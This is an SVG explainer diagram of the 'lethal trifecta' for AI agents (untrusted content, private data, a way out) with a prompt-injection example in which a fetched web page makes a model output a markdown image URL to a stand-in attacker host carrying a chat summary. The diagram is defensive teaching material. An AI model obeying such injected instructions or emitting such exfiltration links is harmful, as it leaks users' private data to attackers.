<defs><marker id="ah-ink" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-ink"/></marker><marker id="as-ink" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-ink"/></marker><marker id="ah-muted" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-muted"/></marker><marker id="as-muted" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-muted"/></marker><marker id="ah-blue" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-blue"/></marker><marker id="as-blue" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-blue"/></marker><marker id="ah-orange" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-orange"/></marker><marker id="as-orange" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-orange"/></marker><marker id="ah-green" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-green"/></marker><marker id="as-green" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-green"/></marker><marker id="ah-red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-red"/></marker><marker id="as-red" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-red"/></marker><marker id="ah-purple" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-purple"/></marker><marker id="as-purple" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-purple"/></marker><marker id="ah-grey" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0,0 L10,5 L0,10 z" class="f-grey"/></marker><marker id="as-grey" viewBox="0 0 10 10" refX="1" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M10,0 L0,5 L10,10 z" class="f-grey"/></marker></defs>
<rect class="bg" x="0" y="0" width="840" height="386"/>
<text x="24" y="30" font-size="17" font-weight="700" class="t-ink display" xml:space="preserve">The lethal trifecta: three things that together leak data</text>
<g transform="translate(0 44)"><text x="20" y="10" font-size="14.5" font-weight="700" class="t-red" xml:space="preserve">1  Untrusted content</text><text x="20" y="30" font-size="12" class="t-muted" xml:space="preserve">attacker writes it</text><rect x="20" y="44" width="200" height="92" rx="6" class="fs-red s-red" stroke-width="1.5"/><text x="120" y="70" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">email, web page,</text><text x="120" y="90" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">document, issue,</text><text x="120" y="110" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">tool result</text><text x="250" y="10" font-size="14.5" font-weight="700" class="t-blue" xml:space="preserve">2  Private data</text><text x="250" y="30" font-size="12" class="t-muted" xml:space="preserve">the agent can read it</text><rect x="250" y="44" width="200" height="92" rx="6" class="fs-blue s-blue" stroke-width="1.5"/><text x="350" y="70" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">inbox, private repos,</text><text x="350" y="90" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">files, chat history</text><text x="480" y="10" font-size="14.5" font-weight="700" class="t-orange" xml:space="preserve">3  A way out</text><text x="480" y="30" font-size="12" class="t-muted" xml:space="preserve">the agent can use it</text><rect x="480" y="44" width="200" height="92" rx="6" class="fs-orange s-orange" stroke-width="1.5"/><text x="580" y="70" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">image URL, link,</text><text x="580" y="90" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">API call, email,</text><text x="580" y="110" font-size="12.5" text-anchor="middle" class="t-ink" xml:space="preserve">pull request</text><line x1="222" y1="90" x2="248" y2="90" class="s-muted" stroke-width="1.5" marker-end="url(#ah-muted)"/><line x1="452" y1="90" x2="478" y2="90" class="s-muted" stroke-width="1.5" marker-end="url(#ah-muted)"/><rect x="710" y="54" width="110" height="72" rx="6" class="fs-grey s-grey" stroke-width="1.5"/><text x="765" y="73.75" font-size="12.5" text-anchor="middle" dominant-baseline="central" class="t-ink" xml:space="preserve">attacker's</text><text x="765" y="90" font-size="12.5" text-anchor="middle" dominant-baseline="central" class="t-ink" xml:space="preserve">server or</text><text x="765" y="106.25" font-size="12.5" text-anchor="middle" dominant-baseline="central" class="t-ink" xml:space="preserve">public page</text><line x1="682" y1="90" x2="708" y2="90" class="s-muted" stroke-width="1.5" marker-end="url(#ah-muted)"/><line x1="20" y1="160" x2="820" y2="160" class="grid" stroke-width="1"/><text x="20" y="184" font-size="13.5" font-weight="600" class="t-ink" xml:space="preserve">Example: the markdown image channel</text><text x="20" y="208" font-size="12.5" class="t-ink" xml:space="preserve">A fetched web page tells the model to summarize the chat and output:</text><rect x="20" y="220" width="560" height="34" rx="6" class="s-orange" fill="none" stroke-width="1.5"/><text x="300" y="237" font-size="12.5" text-anchor="middle" dominant-baseline="central" class="t-ink mono" xml:space="preserve">![data exfiltration in progress](https://attacker/q=SUMMARY)</text><text x="20" y="278" font-size="12.5" class="t-ink" xml:space="preserve">The chat UI loads the image by itself, so the browser sends the summary to the attacker. No click.</text><text x="20" y="302" font-size="12.5" font-weight="600" class="t-ink" xml:space="preserve">Take away any one of the three boxes and this attack has nowhere to go.</text></g>
<text x="24" y="375" font-size="11.5" font-style="italic" class="t-muted" xml:space="preserve">Based on Willison, “The lethal trifecta for AI agents” (2025). Image example from Rehberger (2023).</text>
</svg>
